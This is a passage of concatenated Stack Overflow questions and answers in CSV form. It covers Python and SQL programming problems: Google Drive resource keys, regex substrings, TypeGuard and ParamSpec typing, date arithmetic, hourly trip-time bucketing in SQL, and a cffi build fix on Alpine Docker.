<p>In the mean time I discovered <a href=""https://github.com/googlearchive/PyDrive"" rel=""nofollow noreferrer"">pydrive</a> and <a href=""https://github.com/iterative/PyDrive2"" rel=""nofollow noreferrer"">pydrive2</a>, two wrappers around Google API v2 that allows to do very useful things such as listing files from folders and basically allows to do the same thing with a lighter syntax:</p>
<pre class=""lang-py prettyprint-override""><code>from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive
import io
import re
CLIENT_SECRET_FILE = &quot;client_secrets.json&quot;

gauth = GoogleAuth()
gauth.LocalWebserverAuth()
drive = GoogleDrive(gauth)
regex = &quot;(?&lt;=https://drive.google.com/file/d/)[a-zA-Z0-9]+&quot;
for i, l in enumerate(links_to_download):
    url = l
    file_id = re.search(regex, url)[0]
    file_handle = drive.CreateFile({'id': file_id})
    file_handle.GetContentFile(f&quot;file_{i}&quot;)
</code></pre>
<p>However now whether I use pydrive or the raw API <strong>I cannot seem to be able to download the same files</strong> and instead I am met with:</p>
<pre><code>googleapiclient.errors.HttpError: &lt;HttpError 404 when requesting https://www.googleapis.com/drive/v3/files/fileID?alt=media returned &quot;File not found: fileID.&quot;. Details: &quot;[{'domain': 'global', 'reason': 'notFound', 'message': 'File not found: fileID.', 'locationType': 'parameter', 'location': 'fileId'}]&quot;&gt;
</code></pre>
<p>I tried everything and registered 3 different apps using Google console it seems it might be (or not) a question of scoping (see for instance <a href=""https://stackoverflow.com/a/54492150/4844184"">this answer</a>, with apps having access to only files in my Google drive or created by this app). However I did not have this issue before (last year).</p>
<p>When going to the <a href=""https://console.cloud.google.com/apis/credentials/consent?authuser=1"" rel=""nofollow noreferrer"">Google console</a> explicitly giving <code>https://www.googleapis.com/auth/drive</code> as a scope to the API mandates filling a ton of fields with application's website/conditions of use/confidentiality rules/authorized domains and youtube videos explaining the app. However I will be the sole user of this script.
So I could only give explicitly the following scopes:</p>
<pre><code>/auth/drive.appdata
/auth/drive.file
/auth/drive.install
</code></pre>
<p>Is it because of scoping ? Is there a solution that doesn't require creating a homepage and a youtube video ?</p>
<p><strong>EDIT 1:</strong>
Here is an example of <code>links_to_download</code>:</p>
<pre><code>links_to_download = [&quot;https://drive.google.com/file/d/fileID/view?usp=drivesdk&amp;resourcekey=0-resourceKeyValue&quot;]
</code></pre>
<p><strong>EDIT 2:</strong>
It is super instable sometimes it works without a sweat sometimes it doesn't. When I relaunch the script multiple times I get different results. Retry policies are working to a certain extent but sometimes it fails multiple times for hours.</p>
","71351780","<p>Well thanks to the <a href=""https://support.google.com/drive/answer/10729743?hl=en"" rel=""nofollow noreferrer"">security update</a> released by Google few months before. This makes the link sharing stricter and you need resource key as well to access the file in-addition to the <code>fileId</code>.</p>
<p>As per the <a href=""https://developers.google.com/drive/api/v3/resource-keys#syntax"" rel=""nofollow noreferrer"">documentation</a> , You need to provide the resource key as well for newer links, if you want to access it in the header <code>X-Goog-Drive-Resource-Keys</code> as <code>fileId1/resourceKey1</code>.</p>
<p>If you apply this change in your code, it will work as normal. Example edit below:</p>
<pre><code>regex = &quot;(?&lt;=https://drive.google.com/file/d/)[a-zA-Z0-9]+&quot;
regex_rkey = &quot;(?&lt;=resourcekey=)[a-zA-Z0-9-]+&quot;
for i, l in enumerate(links_to_download):
    url = l
    file_id = re.search(regex, url)[0]
    resource_key = re.search(regex_rkey, url)[0]
    request = drive_service.files().get_media(fileId=file_id)
    request.headers[&quot;X-Goog-Drive-Resource-Keys&quot;] = f&quot;{file_id}/{resource_key}&quot;
    fh = io.FileIO(f&quot;file_{i}&quot;, mode='wb')
    downloader = MediaIoBaseDownload(fh, request)
    done = False
    while done is False:
        status, done = downloader.next_chunk()
        print(&quot;Download %d%%.&quot; % int(status.progress() * 100))
</code></pre>
<p>Well, the regex for resource key was something I quickly made, so cannot be sure on if it supports every case. But this provides you the solution.
Now, you may have to listen to old and new links based on this and set the changes.</p>
"
"71349515","1","How to find all possible uniform substrings of a string?","<p>I have a string like</p>
<pre><code>aaabbbbcca
</code></pre>
<p>And I'd like to parse all possible uniform substrings from that. So my expected substrings for this string are</p>
<pre><code>['a', 'aa', 'aaa', 'b', 'bb', 'bbb', 'bbbb', 'c', 'cc', 'a']
</code></pre>
<p>I tried the following</p>
<pre><code>import re

print(re.findall(r&quot;([a-z])(?=\1*)&quot;, &quot;aaabbbbcca&quot;))
# Output: ['a', 'a', 'a', 'b', 'b', 'b', 'b', 'c', 'c', 'a']
</code></pre>
<p>Is it possible trough regular expressions? If yes, then how?</p>
","71349674","<p>You can achieve what you need <strong>without a regex</strong> here:</p>
<pre class=""lang-py prettyprint-override""><code>result = []
text = &quot;aaabbbbcca&quot;
prev = ''
for c in text:
  if c == prev:
    result.append(result[-1] + c)
  else:
    result.append(c)
    prev = c
 
print(result)
# =&gt; ['a', 'aa', 'aaa', 'b', 'bb', 'bbb', 'bbbb', 'c', 'cc', 'a']
</code></pre>
<p>See the <a href=""https://ideone.com/9Ws1da"" rel=""noreferrer"">Python demo</a>.</p>
<p>In short, you can iterate over the string and append new item to a <code>result</code> list when the new char is not equal to the previous char, otherwise, append a new item with the value equal to the previous item + the same char concatenated to the value.</p>
<p><strong>With regex</strong>, the best you can do is</p>
<pre class=""lang-py prettyprint-override""><code>import re
text = &quot;aaabbbbcca&quot;
print( [x.group(1) for x in re.finditer(r'(?=((.)\2*))', text)] )
# =&gt; ['aaa', 'aa', 'a', 'bbbb', 'bbb', 'bb', 'b', 'cc', 'c', 'a']
</code></pre>
<p>See <a href=""https://ideone.com/U7eU8Z"" rel=""noreferrer"">this Python demo</a>. Here, <code>(?=((.)\2*))</code> matches any location inside the string that is immediately preceded with any one char (other than line break chars if you do not use <code>re.DOTALL</code> option) that is followed with zero or more occurrences of the same char (capturing the char(s) into Group 1).</p>
"
"71029876","1","How can I perform a type guard on a property of an object in Python","<p><a href=""https://www.python.org/dev/peps/pep-0647"" rel=""noreferrer"">PEP 647</a> introduced type guards to perform complex type narrowing operations using functions. If I have a class where properties can have various types, is there a way that I can perform a similar type narrowing operation on the property of an object given as the function argument?</p>
<pre class=""lang-py prettyprint-override""><code>class MyClass:
    a: Optional[int]
    b: Optional[str]
    # Some other things

def someTypeGuard(my_obj: MyClass) -&gt; ???:
    return my_obj.a is not None
</code></pre>
<p>I'm thinking it might be necessary for me to implement something to do with square brackets in type hints, but I really don't know where to start on this.</p>
","71252167","<p><code>TypeGuard</code> annotations can be used to annotate subclasses of a class. If parameter types are specified for those classes, then MyPy will recognise the type narrowing operation successfully.</p>
<pre class=""lang-py prettyprint-override""><code>class MyClass:
    a: Optional[int]
    b: Optional[str]
    # Some other things

# Two hidden classes for the different types
class _MyClassInt(MyClass):
    a: int
    b: None
class _MyClassStr(MyClass):
    a: None
    b: str


def someTypeGuard(my_obj: MyClass) -&gt; TypeGuard[_MyClassInt]:
    &quot;&quot;&quot;Check if my_obj's `a` property is NOT `None`&quot;&quot;&quot;
    return my_obj.a is not None

def someOtherTypeGuard(my_obj: MyClass) -&gt; TypeGuard[_MyClassStr]:
    &quot;&quot;&quot;Check if my_obj's `b` property is NOT `None`&quot;&quot;&quot;
    return my_obj.b is not None
</code></pre>
<p>Sadly failure to narrow to one type doesn't automatically narrow to the other type, and I can't find an easy way to do this other than an <code>assert someOtherTypeGuard(obj)</code> in your else block.</p>
<p>Even still this seems to be the best solution.</p>
"
"71371909","1","How to calculate when one's 10000 day after his or her birthday will be","<p>I am wondering how to solve this problem with basic Python (no libraries to be used): How can I calculate when one's 10000 day after their birthday will be (/would be)?</p>
<p>For instance, given Monday 19/05/2008, the desired day is Friday 05/10/2035 (according to <a href=""https://www.durrans.com/projects/calc/10000/index.html?dob=19%2F5%2F2008&amp;e=mc2"" rel=""nofollow noreferrer"">https://www.durrans.com/projects/calc/10000/index.html?dob=19%2F5%2F2008&amp;e=mc2</a>)</p>
<p>So far I have done the following script:</p>
<pre><code>years = range(2000, 2050)
lst_days = []
count = 0
tot_days = 0
for year in years:
    if((year % 400 == 0) or  (year % 100 != 0) and  (year % 4 == 0)):
        lst_days.append(366)
    else:
        lst_days.append(365)
while tot_days &lt;= 10000:
        tot_days = tot_days + lst_days[count]
        count = count+1
print(count)
</code></pre>
<p>Which estimates the person's age after 10,000 days from their birthday (for people born after 2000). But how can I proceed?</p>
","71372125","<p><strong>Using base Python packages only</strong></p>
<p>On the basis that &quot;no special packages&quot; means you can only use base Python packages, you can use <code>datetime.timedelta</code> for this type of problem:</p>
<pre><code>import datetime

start_date = datetime.datetime(year=2008, month=5, day=19)

end_date = start_date + datetime.timedelta(days=10000)

print(end_date.date())
</code></pre>
<p><strong>Without any base packages (and progressing to the problem)</strong></p>
<p>Side-stepping even base Python packages, and taking the problem forwards, something along the lines of the following should help (I hope!).</p>
<p>Start by defining a function that determines if a year is a leap year or not:</p>
<pre><code>def is_it_a_leap_year(year) -&gt; bool:
    &quot;&quot;&quot;
    Determine if a year is a leap year

    Args:
        year: int

    Extended Summary:
        According to:
            https://airandspace.si.edu/stories/editorial/science-leap-year
        The rule is that if the year is divisible by 100 and not divisible by
        400, leap year is skipped. The year 2000 was a leap year, for example,
        but the years 1700, 1800, and 1900 were not.  The next time a leap year
        will be skipped is the year 2100.
    &quot;&quot;&quot;
    if year % 4 != 0:

        return False

    if year % 100 == 0 and year % 400 != 0:

        return False

    return True
</code></pre>
<p>Then define a function that determines the age of a person (utilizing the above to recognise leap years):</p>
<pre><code>def age_after_n_days(start_year: int,
                     start_month: int,
                     start_day: int,
                     n_days: int) -&gt; tuple:
    &quot;&quot;&quot;
    Calculate an approximate age of a person after a given number of days,
    attempting to take into account leap years appropriately.

    Return the number of days left until their next birthday

    Args:
        start_year (int): year of the start date
        start_month (int): month of the start date
        start_day (int): day of the start date
        n_days (int): number of days to elapse
    &quot;&quot;&quot;

    # Check if the start date happens on a leap year and occurs before the
    # 29 February (additional leap year day)
    start_pre_leap = (is_it_a_leap_year(start_year) and start_month &lt; 3)

    # Account for the edge case where you start exactly on the 29 February
    if start_month == 2 and start_day == 29:

        start_pre_leap = False

    # Keep a running counter of age
    age = 0

    # Store the &quot;current year&quot; whilst iterating through the days
    current_year = start_year

    # Count the number of days left
    days_left = n_days

    # While there is at least one year left to elapse...
    while days_left &gt; 364:

        # Is it a leap year?
        if is_it_a_leap_year(current_year):

            # If not the first year
            if age &gt; 0:

                days_left -= 366

            # If the first year is a leap year but starting after the 29 Feb...
            elif age == 0 and not start_pre_leap:

                days_left -= 365

            else:

                days_left -= 366

        # If not a leap year...
        else:

            days_left -= 365

        # If the number of days left hasn't dropped below zero
        if days_left &gt;= 0:

            # Increment age
            age += 1

            # Increment year
            current_year += 1

    return age, days_left
</code></pre>
<p>Using your example, you can test the function with:</p>
<pre><code>age, remaining_days = age_after_n_days(start_year=2000, start_month=5, start_day=19, n_days=10000)
</code></pre>
<p><strong>Now you have the number of complete years that will elapse and the number of remaining days</strong></p>
<p>You can then use the remaining_days to work out the exact date.</p>
"
"71491982","1","how to segment and get the time between two dates?","<p>I have the following table:</p>
<pre><code>id | number_of _trip |      start_date      |      end_date       | seconds
1     637hui           2022-03-10 01:20:00    2022-03-10 01:32:00    720  
2     384nfj           2022-03-10 02:18:00    2022-03-10 02:42:00    1440
3     102fiu           2022-03-10 02:10:00    2022-03-10 02:23:00    780
4     948pvc           2022-03-10 02:40:00    2022-03-10 03:20:00    2400
5     473mds           2022-03-10 02:45:00    2022-03-10 02:58:00    780
6     103fkd           2022-03-10 03:05:00    2022-03-10 03:28:00    1380
7     905783           2022-03-10 03:12:00             null           0 
8     498wsq           2022-03-10 05:30:00    2022-03-10 05:48:00    1080
</code></pre>
<p>I want to get the time that is driven for each hour, but if a trip takes the space of two hours, the time must be taken for each hour.
If the end of the trip has not yet finished, the <code>end_date</code> field is null, but it must count the time it is taking in the respective hours from <code>start_date</code>.</p>
<p>I have the following query:</p>
<pre><code>SELECT time_bucket(bucket_width := INTERVAL '1 hour',ts := start_date, &quot;offset&quot; := '0 minutes') AS init_date,
       sum(seconds) as seconds
        FROM trips
        WHERE start_date &gt;= '2022-03-10 01:00:00' AND start_date &lt;= '2022-03-10 06:00:00'
        GROUP BY init_date
        ORDER BY init_date;
</code></pre>
<p>The result is:</p>
<pre><code>|   init_date         | seconds 
  2022-03-10 01:00:00    720
  2022-03-10 02:00:00    5400
  2022-03-10 03:00:00    1380
  2022-03-10 05:00:00    1080
</code></pre>
<p>However I expect to receive a result like this:</p>
<pre><code>|   init_date         | seconds     solo como una ayuda visual
  2022-03-10 01:00:00    720          id(1:720)
  2022-03-10 02:00:00    4200         id(2: 1440 3: 780 4: 1200 5: 780)
  2022-03-10 03:00:00    5460         id(4:1200 6:1380 7:2880)
  2022-03-10 05:00:00    1080         id(8:1080)
</code></pre>
<p><strong>EDIT</strong><br />
If I replace the null the result is still unwanted:</p>
<pre><code>|   init_date       | seconds 
2022-03-10 01:00:00   720
2022-03-10 02:00:00   5400
2022-03-10 03:00:00   1380
2022-03-10 05:00:00   1080
</code></pre>
<p>I have been thinking about getting all the data and solving the problem with pandas. I'll try and post if I get the answer.
<strong>EDIT</strong></p>
<p>My previous result was not entirely correct, since there were hours left of a trip that has not yet finished, the correct result should be:</p>
<pre><code>       start_date  seconds
0 2022-03-10 01:00:00      720
1 2022-03-10 02:00:00     4200
2 2022-03-10 03:00:00     5460
3 2022-03-10 04:00:00     3600
4 2022-03-10 05:00:00     4680
</code></pre>
<p><strong>NEW CODE</strong></p>
<pre><code>def bucket_count(bucket, data):
    result = pd.DataFrame()
    list_r = []

    for row_bucket in bucket.to_dict('records'):
        inicio = row_bucket['start_date']
        fin = row_bucket['end_date']

        df = data[
                (inicio &lt;= data['end_date']) &amp; (inicio &lt;= fin) &amp; (data['start_date'] &lt;= fin) &amp; (data['start_date'] &lt;= data['end_date'])
        ]
        df_dict = df.to_dict('records')

        for row in df_dict:
            seconds = 0
            if row['start_date'] &gt;= inicio and fin &gt;= row['end_date']:
                seconds = (row['end_date'] - row['start_date']).total_seconds()
            elif row['start_date'] &lt;= inicio &lt;= row['end_date'] &lt;= fin:
                seconds = (row['end_date'] - inicio).total_seconds()
            elif inicio &lt;= row['start_date'] &lt;= fin &lt;= row['end_date']:
                seconds = (fin - row['start_date']).total_seconds()
            elif row['start_date'] &lt; inicio and fin &lt; row['end_date']:
                seconds = (fin - inicio).total_seconds()

            row['start_date'] = inicio
            row['end_date'] = fin
            row['seconds'] = seconds
            list_r.append(row)

    result = pd.DataFrame(list_r)
    return result.groupby(['start_date'])[&quot;seconds&quot;].apply(lambda x: x.astype(int).sum()).reset_index()
</code></pre>
","71846320","<p>This can be done in plain sql (apart from <code>time_bucket</code> function), in a nested sql query:</p>
<pre><code>select 
    interval_start, 
    sum(seconds_before_trip_ended - seconds_before_trip_started) as seconds
from (
    select 
        interval_start,
        greatest(0, extract(epoch from start_date - interval_start)::int) as seconds_before_trip_started,
        least(3600, extract(epoch from coalesce(end_date, '2022-03-10 06:00:00') - interval_start)::int) as seconds_before_trip_ended
    from (
        select generate_series(
            (select min(time_bucket(bucket_width := INTERVAL '1 hour', ts := start_date, &quot;offset&quot; := '0 minutes')) from trips),
            (select max(time_bucket(bucket_width := INTERVAL '1 hour', ts := coalesce(end_date, '2022-03-10 06:00:00'), &quot;offset&quot; := '0 minutes')) from trips),
            '1 hour') as interval_start) i
    join trips t
        on t.start_date &lt;= i.interval_start + interval '1 hour'
        and coalesce(t.end_date, '2022-03-10 06:00:00') &gt;= interval_start
    ) subq
group by interval_start
order by interval_start;
</code></pre>
<p>This gives me the following result:</p>
<pre><code>   interval_start    | seconds
---------------------+---------
 2022-03-10 01:00:00 |     720
 2022-03-10 02:00:00 |    4200
 2022-03-10 03:00:00 |    5460
 2022-03-10 04:00:00 |    3600
 2022-03-10 05:00:00 |    4680
 2022-03-10 06:00:00 |       0
(6 rows)
</code></pre>
<h2>Explanation</h2>
<p>Let's break the query down.</p>
<p>In the innermost query:</p>
<pre><code>select generate_series(
        (select min(time_bucket(bucket_width := INTERVAL '1 hour', ts := start_date, &quot;offset&quot; := '0 minutes')) from trips),
        (select max(time_bucket(bucket_width := INTERVAL '1 hour', ts := coalesce(end_date, '2022-03-10 06:00:00'), &quot;offset&quot; := '0 minutes')) from trips),
        '1 hour'
    ) as interval_start
</code></pre>
<p>we generate a series of time interval starts - from minimal <code>start_date</code> value up to the maximal <code>end_time</code> value, truncated to full hours, with 1-hour step. Each boundary can obviously be replaced with an arbitrary datetime. Direct result of this query is the following:</p>
<pre><code>   interval_start
---------------------
 2022-03-10 01:00:00
 2022-03-10 02:00:00
 2022-03-10 03:00:00
 2022-03-10 04:00:00
 2022-03-10 05:00:00
 2022-03-10 06:00:00
(6 rows)
</code></pre>
<p>Then, the middle-level query joins this series with the <code>trips</code> table, joining rows if and only if any part of the trip took place during the hour-long interval beginning at the time given by the 'interval_start' column:</p>
<pre><code>select interval_start,
    greatest(0, extract(epoch from start_date - interval_start)::int) as seconds_before_trip_started,
    least(3600, extract(epoch from coalesce(end_date, '2022-03-10 06:00:00') - interval_start)::int) as seconds_before_trip_ended
from (
    -- innermost query
    select generate_series(
        (select min(time_bucket(bucket_width := INTERVAL '1 hour', ts := start_date, &quot;offset&quot; := '0 minutes')) from trips),
        (select max(time_bucket(bucket_width := INTERVAL '1 hour', ts := coalesce(end_date, '2022-03-10 06:00:00'), &quot;offset&quot; := '0 minutes')) from trips),
        '1 hour'
    ) as interval_start
    -- innermost query end
) intervals
join trips t
    on t.start_date &lt;= intervals.interval_start + interval '1 hour' and coalesce(t.end_date, '2022-03-10 06:00:00') &gt;= intervals.interval_start
</code></pre>
<p>The two computed values represent respectively:</p>
<ul>
<li><code>seconds_before_trip_started</code> - number of second passed between the beginning of the interval, and the beginning of the trip (or 0 if the trip begun prior to interval start). This is the time the trip <strong>didn't</strong> take place - thus we will be substructing it in the following step</li>
<li><code>seconds_before_trip_ended</code> - number of seconds passed between the end of the interval, and the end of the trip (or 3600 if the trip didn't end within concerned interval).</li>
</ul>
<p>The outermost query substracts the two beformentioned fields, effectively computing the time each trip took in each interval, and sums it for all trips, grouping by interval:</p>
<pre><code>select 
    interval_start, 
    sum(seconds_before_trip_ended - seconds_before_trip_started) as seconds
from (
-- middle-level query
    select 
        interval_start,
        greatest(0, extract(epoch from start_date - interval_start)::int) as seconds_before_trip_started,
        least(3600, extract(epoch from coalesce(end_date, '2022-03-10 06:00:00') - interval_start)::int) as seconds_before_trip_ended
    from (
        select generate_series(
            (select min(time_bucket(bucket_width := INTERVAL '1 hour', ts := start_date, &quot;offset&quot; := '0 minutes')) from trips),
            (select max(time_bucket(bucket_width := INTERVAL '1 hour', ts := coalesce(end_date, '2022-03-10 06:00:00'), &quot;offset&quot; := '0 minutes')) from trips),
            '1 hour') as interval_start) i
    join trips t
        on t.start_date &lt;= i.interval_start + interval '1 hour'
        and coalesce(t.end_date, '2022-03-10 06:00:00') &gt;= interval_start
-- middle-level query end
    ) subq
group by interval_start
order by interval_start;
</code></pre>
<h2>Additional grouping</h2>
<p>In case we have another column in the table, and what we really need is the segmentation of the above result in respect to that column, we simply need to add it to the appropriate <code>select</code> and <code>group by</code> clauses (optionally to <code>order by</code> clause as well).</p>
<p>Suppose there's an additional <code>driver_id</code> column in the <code>trips</code> table:</p>
<pre><code> id | number_of_trip |     start_date      |      end_date       | seconds | driver_id
----+----------------+---------------------+---------------------+---------+-----------
  1 | 637hui         | 2022-03-10 01:20:00 | 2022-03-10 01:32:00 |     720 |         0
  2 | 384nfj         | 2022-03-10 02:18:00 | 2022-03-10 02:42:00 |    1440 |         0
  3 | 102fiu         | 2022-03-10 02:10:00 | 2022-03-10 02:23:00 |     780 |         1
  4 | 948pvc         | 2022-03-10 02:40:00 | 2022-03-10 03:20:00 |    2400 |         1
  5 | 473mds         | 2022-03-10 02:45:00 | 2022-03-10 02:58:00 |     780 |         1
  6 | 103fkd         | 2022-03-10 03:05:00 | 2022-03-10 03:28:00 |    1380 |         2
  7 | 905783         | 2022-03-10 03:12:00 |                     |       0 |         2
  8 | 498wsq         | 2022-03-10 05:30:00 | 2022-03-10 05:48:00 |    1080 |         2
</code></pre>
<p>The modified query would look like that:</p>
<pre><code>select
    interval_start,
    driver_id,
    sum(seconds_before_trip_ended - seconds_before_trip_started) as seconds
from (
    select 
        interval_start,
        driver_id,
        greatest(0, extract(epoch from start_date - interval_start)::int) as seconds_before_trip_started,
        least(3600, extract(epoch from coalesce(end_date, '2022-03-10 06:00:00') - interval_start)::int) as seconds_before_trip_ended
    from (
        select generate_series(
            (select min(time_bucket(bucket_width := INTERVAL '1 hour', ts := start_date, &quot;offset&quot; := '0 minutes')) from trips),
            (select max(time_bucket(bucket_width := INTERVAL '1 hour', ts := coalesce(end_date, '2022-03-10 06:00:00'), &quot;offset&quot; := '0 minutes')) from trips),
            '1 hour') as interval_start
    ) intervals
    join trips t
        on t.start_date &lt;= intervals.interval_start + interval '1 hour'
        and coalesce(t.end_date, '2022-03-10 06:00:00') &gt;= intervals.interval_start
) subq
group by interval_start, driver_id
order by interval_start, driver_id;
</code></pre>
<p>and give the following result:</p>
<pre><code>   interval_start    | driver_id | seconds
---------------------+-----------+---------
 2022-03-10 01:00:00 |         0 |     720
 2022-03-10 02:00:00 |         0 |    1440
 2022-03-10 02:00:00 |         1 |    2760
 2022-03-10 03:00:00 |         1 |    1200
 2022-03-10 03:00:00 |         2 |    4260
 2022-03-10 04:00:00 |         2 |    3600
 2022-03-10 05:00:00 |         2 |    4680
 2022-03-10 06:00:00 |         2 |       0
</code></pre>
"
"71253495","1","How to annotate the type of arguments forwarded to another function?","<p>Let's say we have a trivial function that calls <code>open()</code> but with a fixed argument:</p>
<pre class=""lang-py prettyprint-override""><code>def open_for_writing(*args, **kwargs):
    kwargs['mode'] = 'w'
    return open(*args, **kwargs)
</code></pre>
<p>If I now try to call <code>open_for_writing(some_fake_arg = 123)</code>, no type checker (e.g. mypy) can tell that this is an incorrect invocation: it's missing the required <code>file</code> argument, and is adding another argument that isn't part of the <code>open</code> signature.</p>
<p>How can I tell the type checker that <code>*args</code> and <code>**kwargs</code> must be a subset of the <code>open</code> parameter spec? I realise Python 3.10 has the new <code>ParamSpec</code> type, but it doesn't seem to apply here because you can't get the <code>ParamSpec</code> of a concrete function like <code>open</code>.</p>
","71262408","<p>I think out of the box this is not possible. However, you could write a decorator that takes the function that contains the arguments you want to get checked for (open in your case) as an input and returns the decorated function, i.e. open_for_writing in your case. This of course only works with python 3.10 or using typing_extensions as it makes use of ParamSpec</p>
<pre class=""lang-py prettyprint-override""><code>from typing import TypeVar, ParamSpec, Callable, Optional

T = TypeVar('T')
P = ParamSpec('P')


def take_annotation_from(this: Callable[P, Optional[T]]) -&gt; Callable[[Callable], Callable[P, Optional[T]]]:
    def decorator(real_function: Callable) -&gt; Callable[P, Optional[T]]:
        def new_function(*args: P.args, **kwargs: P.kwargs) -&gt; Optional[T]:
            return real_function(*args, **kwargs)

        return new_function
    return decorator

@take_annotation_from(open)
def open_for_writing(*args, **kwargs):
    kwargs['mode'] = 'w'
    return open(*args, **kwargs)


open_for_writing(some_fake_arg=123)
open_for_writing(file='')
</code></pre>
<p>As shown <a href=""https://mypy-play.net/?mypy=0.931&amp;python=3.10&amp;gist=31e2a933dbca2c5ed712c79812a339fd"" rel=""noreferrer"">here</a>, mypy complains now about getting an unknown argument.</p>
"
"71372066","1","Docker fails to install cffi with python:3.9-alpine in Dockerfile","<p>Im trying to run the below Dockerfile using docker-compose.
I searched around but I couldnt find a solution on how to install cffi with python:3.9-alpine.</p>
<p>I also read this post which states that pip 21.2.4 or greater can be a possible solution but it didn't work out form me</p>
<p><a href=""https://www.pythonfixing.com/2021/09/fixed-why-i-getting-this-error-while.html"" rel=""noreferrer"">https://www.pythonfixing.com/2021/09/fixed-why-i-getting-this-error-while.html</a></p>
<p>Docker file</p>
<pre><code>FROM python:3.9-alpine

ENV PYTHONDONTWRITEBYTECODE 1
ENV PYTHONUNBUFFERED 1

COPY ./requirements.txt .

RUN apk add --update --no-cache postgresql-client

RUN apk add --update --no-cache --virtual .tmp-build-deps \
    gcc libc-dev linux-headers postgresql-dev
RUN pip3 install --upgrade pip &amp;&amp; pip3 install -r /requirements.txt

RUN apk del .tmp-build-deps

RUN mkdir /app
WORKDIR /app
COPY . /app

RUN adduser -D user

USER user
</code></pre>
<p>This is the requirements.txt file.</p>
<pre><code>asgiref==3.5.0
backports.zoneinfo==0.2.1
certifi==2021.10.8
cffi==1.15.0
cfgv==3.3.1
...
</code></pre>
<p>Error message:</p>
<pre><code>process-exited-with-error
#9 47.99   
#9 47.99   × Running setup.py install for cffi did not run successfully.
#9 47.99   │ exit code: 1
#9 47.99   ╰─&gt; [58 lines of output]
#9 47.99       Package libffi was not found in the pkg-config search path.
#9 47.99       Perhaps you should add the directory containing `libffi.pc'
#9 47.99       to the PKG_CONFIG_PATH environment variable
#9 47.99       Package 'libffi', required by 'virtual:world', not found
#9 47.99       Package libffi was not found in the pkg-config search path.
#9 47.99       Perhaps you should add the directory containing `libffi.pc'
#9 47.99       to the PKG_CONFIG_PATH environment variable
#9 47.99       Package 'libffi', required by 'virtual:world', not found
#9 47.99       Package libffi was not found in the pkg-config search path.
#9 47.99       Perhaps you should add the directory containing `libffi.pc'
#9 47.99       to the PKG_CONFIG_PATH environment variable
#9 47.99       Package 'libffi', required by 'virtual:world', not found
#9 47.99       Package libffi was not found in the pkg-config search path.
#9 47.99       Perhaps you should add the directory containing `libffi.pc'
#9 47.99       to the PKG_CONFIG_PATH environment variable
#9 47.99       Package 'libffi', required by 'virtual:world', not found
#9 47.99       Package libffi was not found in the pkg-config search path.
#9 47.99       Perhaps you should add the directory containing `libffi.pc'
#9 47.99       to the PKG_CONFIG_PATH environment variable
#9 47.99       Package 'libffi', required by 'virtual:world', not found
#9 47.99       running install
#9 47.99       running build
#9 47.99       running build_py
#9 47.99       creating build
#9 47.99       creating build/lib.linux-aarch64-3.9
#9 47.99       creating build/lib.linux-aarch64-3.9/cffi
#9 47.99       copying cffi/__init__.py -&gt; build/lib.linux-aarch64-3.9/cffi
#9 47.99       copying cffi/cffi_opcode.py -&gt; build/lib.linux-aarch64-3.9/cffi
#9 47.99       copying cffi/commontypes.py -&gt; build/lib.linux-aarch64-3.9/cffi
#9 47.99       copying cffi/vengine_gen.py -&gt; build/lib.linux-aarch64-3.9/cffi
#9 47.99       copying cffi/vengine_cpy.py -&gt; build/lib.linux-aarch64-3.9/cffi
#9 47.99       copying cffi/backend_ctypes.py -&gt; build/lib.linux-aarch64-3.9/cffi
#9 47.99       copying cffi/api.py -&gt; build/lib.linux-aarch64-3.9/cffi
#9 47.99       copying cffi/ffiplatform.py -&gt; build/lib.linux-aarch64-3.9/cffi
#9 47.99       copying cffi/verifier.py -&gt; build/lib.linux-aarch64-3.9/cffi
#9 47.99       copying cffi/error.py -&gt; build/lib.linux-aarch64-3.9/cffi
#9 47.99       copying cffi/setuptools_ext.py -&gt; build/lib.linux-aarch64-3.9/cffi
#9 47.99       copying cffi/lock.py -&gt; build/lib.linux-aarch64-3.9/cffi
#9 47.99       copying cffi/recompiler.py -&gt; build/lib.linux-aarch64-3.9/cffi
#9 47.99       copying cffi/pkgconfig.py -&gt; build/lib.linux-aarch64-3.9/cffi
#9 47.99       copying cffi/cparser.py -&gt; build/lib.linux-aarch64-3.9/cffi
#9 47.99       copying cffi/model.py -&gt; build/lib.linux-aarch64-3.9/cffi
#9 47.99       copying cffi/_cffi_include.h -&gt; build/lib.linux-aarch64-3.9/cffi
#9 47.99       copying cffi/parse_c_type.h -&gt; build/lib.linux-aarch64-3.9/cffi
#9 47.99       copying cffi/_embedding.h -&gt; build/lib.linux-aarch64-3.9/cffi
#9 47.99       copying cffi/_cffi_errors.h -&gt; build/lib.linux-aarch64-3.9/cffi
#9 47.99       warning: build_py: byte-compiling is disabled, skipping.
#9 47.99       
#9 47.99       running build_ext
#9 47.99       building '_cffi_backend' extension
#9 47.99       creating build/temp.linux-aarch64-3.9
#9 47.99       creating build/temp.linux-aarch64-3.9/c
#9 47.99       gcc -Wno-unused-result -Wsign-compare -DNDEBUG -g -fwrapv -O3 -Wall -DTHREAD_STACK_SIZE=0x100000 -fPIC -DUSE__THREAD -DHAVE_SYNC_SYNCHRONIZE -I/usr/include/ffi -I/usr/include/libffi -I/usr/local/include/python3.9 -c c/_cffi_backend.c -o build/temp.linux-aarch64-3.9/c/_cffi_backend.o
#9 47.99       c/_cffi_backend.c:15:10: fatal error: ffi.h: No such file or directory
#9 47.99          15 | #include &lt;ffi.h&gt;
#9 47.99             |          ^~~~~~~
#9 47.99       compilation terminated.
#9 47.99       error: command '/usr/bin/gcc' failed with exit code 1
#9 47.99       [end of output]
#9 47.99   
#9 47.99   note: This error originates from a subprocess, and is likely not a problem with pip.
#9 47.99 error: legacy-install-failure
#9 47.99 
#9 47.99 × Encountered error while trying to install package.
#9 47.99 ╰─&gt; cffi
#9 47.99 
#9 47.99 note: This is an issue with the package mentioned above, not pip.
#9 47.99 hint: See above for output from the failure.
</code></pre>
","71372163","<p>@Klaus D.'s comment helped a lot.
I updated Dockerfile:</p>
<pre><code>RUN apk add --update --no-cache --virtual .tmp-build-deps \
    gcc libc-dev linux-headers postgresql-dev \
    &amp;&amp; apk add libffi-dev
</code></pre>
"
